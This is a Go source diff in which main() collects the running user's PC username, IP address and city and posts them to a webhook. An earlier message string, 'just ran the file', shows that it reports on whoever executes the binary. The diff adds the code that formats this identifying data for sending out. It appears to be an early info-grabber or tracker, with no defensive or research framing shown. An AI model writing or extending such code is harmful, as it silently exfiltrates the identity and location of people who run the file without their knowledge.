@@ -2,18 +2,31 @@ package main
 
 import (
 	"encoding/json"
-	"fmt"
+	"strings"
 )
 
 func main() {
-	var messageContent string
-	var pcUsername string = getPcUsername()
-	var ip string = getIp()
-	const thing string = "fdsfsf"
-	messageContent = fmt.Sprintf("%s with the ip %s just ran the file", pcUsername, ip)
-	//timeIt()
-	webhook(messageContent)
-	println(getIp())
+	data := makeWebhookString()
+	webhook(data)
+}
+
+func makeWebhookString() string {
+	var buffer strings.Builder
+	var info IpInfo = NewIpInfo()
+	var pcUsername = getPcUsername()
+	var dashCount = len(pcUsername) + 2
+	buffer.WriteString("**")
+	buffer.WriteString(pcUsername)
+	buffer.WriteString("**\n")
+	buffer.WriteString(strings.Repeat("-", dashCount))
+	buffer.WriteString("\n")
+	buffer.WriteString("Location: ")
+	buffer.WriteString(info.City)
+	buffer.WriteString("\n")
+	buffer.WriteString("ip: ")
+	buffer.WriteString(info.Ip)
+	buffer.WriteString("\n")
+	return buffer.String()
 }
 
 func dojson(str string) {
@@ -24,17 +37,6 @@ func dojson(str string) {
 	for key, value := range result {
 		println(key, ": ", value)
 	}
-}
-
-func isPalindrome(x int) bool {
-
-	var reversed int
-	temp := x
-	for temp > 0 {
-		reversed = reversed*10 + temp%10
-		temp /= 10
-	}
-	return reversed == x
 }
 
 func DoErr(err *error) {
